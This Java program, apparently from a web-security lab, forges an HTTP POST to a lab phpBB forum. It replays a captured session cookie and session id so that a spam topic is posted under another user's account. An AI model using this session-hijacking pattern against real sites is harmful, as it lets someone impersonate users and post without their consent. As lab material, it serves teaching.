import java.io.*;
import java.net.*;
public class HTTPSimpleForge {
	public static void main(String[] args) throws IOException {
		try {
			int responseCode;
			InputStream responseIn=null;
			// URL to be forged.
			URL url = new URL ("http://www.xsslabphpbb.com/posting.php");
			// URLConnection instance is created to further parameterize a
			// resource request past what the state members of URL instance
			// can represent.
			URLConnection urlConn = url.openConnection();
			if (urlConn instanceof HttpURLConnection) {
				urlConn.setConnectTimeout(60000);
				urlConn.setReadTimeout(90000);
			}
			// addRequestProperty method is used to add HTTP Header Information.
			// Here we add User-Agent HTTP header to the forged HTTP packet.
			urlConn.addRequestProperty("Host", "www.xsslabphpbb.com");
			urlConn.addRequestProperty("Keep-Alive", "300");
			urlConn.addRequestProperty("Connection", "keep-alive");
			urlConn.addRequestProperty("Cookie", "phpbb2mysql_data=a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A0%3A%22%22%3Bs%3A6%3A%22userid%22%3Bs%3A1%3A%222%22%3B%7D; phpbb2mysql_sid=a48278d8c065062908d74694211d6d08; phpbb2mysql_t=a%3A27%3A%7Bi%3A2%3Bi%3A1350905947%3Bi%3A3%3Bi%3A1350874877%3Bi%3A4%3Bi%3A1350876074%3Bi%3A5%3Bi%3A1350876330%3Bi%3A6%3Bi%3A1350902146%3Bi%3A7%3Bi%3A1350902719%3Bi%3A8%3Bi%3A1350903518%3Bi%3A9%3Bi%3A1350903571%3Bi%3A10%3Bi%3A1350903703%3Bi%3A11%3Bi%3A1350903996%3Bi%3A12%3Bi%3A1350904099%3Bi%3A13%3Bi%3A1350905066%3Bi%3A14%3Bi%3A1350912092%3Bi%3A15%3Bi%3A1350905914%3Bi%3A16%3Bi%3A1350909515%3Bi%3A17%3Bi%3A1350909869%3Bi%3A18%3Bi%3A1350910491%3Bi%3A19%3Bi%3A1350910473%3Bi%3A20%3Bi%3A1350910511%3Bi%3A21%3Bi%3A1350910525%3Bi%3A22%3Bi%3A1350910620%3Bi%3A23%3Bi%3A1350961095%3Bi%3A24%3Bi%3A1350912072%3Bi%3A25%3Bi%3A1350912344%3Bi%3A26%3Bi%3A1350912488%3Bi%3A27%3Bi%3A1350959880%3Bi%3A28%3Bi%3A1350959882%3B%7D");
			urlConn.addRequestProperty("Content-Type", "application/x-www-form-urlencoded");
			//HTTP Post Data which includes the information to be sent to the server.
			String data = "subject=Java+Spammer&addbbcode18=%23444444&addbbcode20=0&helpbox=Ordered+list%3A+%5Blist%3D%5Dtext%5B%2Flist%5D++%28alt%2Bo%29&message=Yay+I+spammed&topictype=0&poll_title=&add_poll_option_text=&poll_length=&mode=newtopic&sid=a48278d8c065062908d74694211d6d08&f=1&post=Submit";
			// DoOutput flag of URL Connection should be set to true
			// to send HTTP POST message.
			urlConn.setDoOutput(true);
			// OutputStreamWriter is used to write the HTTP POST data
			// to the url connection.
			OutputStreamWriter wr = new OutputStreamWriter(urlConn.getOutputStream());
			wr.write(data);
			wr.flush();
			// HttpURLConnection a subclass of URLConnection is returned by
			// url.openConnection() since the url is an http request.
			if (urlConn instanceof HttpURLConnection) {
			HttpURLConnection httpConn = (HttpURLConnection) urlConn;
			// Contacts the web server and gets the status code from
			// HTTP Response message.
			responseCode = httpConn.getResponseCode();
			System.out.println("Response Code = " + responseCode);
			// HTTP status code HTTP_OK means the response was
			// received sucessfully.
			if (responseCode == HttpURLConnection.HTTP_OK) {
				// Get the input stream from url connection object.
				responseIn = urlConn.getInputStream();
				// Create an instance for BufferedReader
				// to read the response line by line.
				BufferedReader buf_inp = new BufferedReader(
				new InputStreamReader(responseIn));
				String inputLine;
				while((inputLine = buf_inp.readLine())!=null) {
					System.out.println(inputLine);
				}
			}
		}
	} catch (MalformedURLException e) {
		e.printStackTrace();
	}
}
			}
